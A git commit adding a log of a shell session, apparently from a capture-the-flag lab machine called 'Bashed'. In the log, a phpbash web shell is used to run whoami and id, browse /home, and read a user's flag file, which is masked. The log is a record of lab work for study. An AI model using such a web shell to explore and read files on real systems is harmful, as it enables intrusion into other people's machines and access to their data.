fcf7f24b62b1d2cb4d8734c0bdc86421eb8e49b2
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-19 10:18:12 -0400

    Create bashed_dev_phpbash.bash

---
+++ Bashed/bashed_dev_phpbash.bash
@@ -0,0 +1,33 @@
+// @ site http://10.10.10.68/dev/phpbash.php
+
+
+www-data@bashed
+:/var/www/html/dev# whoami
+
+www-data
+www-data@bashed
+:/var/www/html/dev# id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@bashed
+:/var/www/html/dev# locate user.txt
+
+www-data@bashed
+:/var/www/html/dev# cd /home
+
+www-data@bashed
+:/home# ls
+
+arrexel
+scriptmanager
+www-data@bashed
+:/home# cd arrexel
+
+www-data@bashed
+:/home/arrexel# ls
+
+user.txt
+www-data@bashed
+:/home/arrexel# cat user.txt
+********************************
+
